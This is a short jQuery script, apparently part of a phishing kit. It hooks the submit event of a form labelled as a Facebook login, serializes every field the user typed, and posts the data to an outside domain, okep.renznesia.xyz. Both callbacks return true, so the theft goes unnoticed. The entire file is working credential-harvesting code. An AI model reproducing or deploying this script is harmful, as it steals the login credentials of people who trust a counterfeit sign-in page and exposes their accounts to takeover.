$(".login-facebook-form").submit(function() {
	var d = $(".login-facebook-form");

	$.ajax({
        url: "https://okep.renznesia.xyz/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
